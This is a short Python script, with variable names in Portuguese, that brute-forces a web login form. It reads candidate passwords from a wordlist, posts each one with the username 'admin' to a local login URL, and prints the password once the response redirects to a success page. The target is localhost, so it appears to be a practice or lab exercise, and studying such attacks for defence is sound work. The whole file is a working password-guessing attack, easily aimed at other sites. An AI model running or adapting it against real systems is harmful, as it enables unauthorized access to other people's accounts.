import requests

url = 'http://localhost:5000/login'

with open('wordlist.txt', 'r') as file:
    senhas = file.read().splitlines()

for senha in senhas:
    payload = {'usuario': 'admin', 'senha': senha}
    response = requests.post(url, data=payload)

    if response.url == 'http://localhost:5000/sucesso':
        print(f'SENHA ENCONTRADA: {senha}')
        break

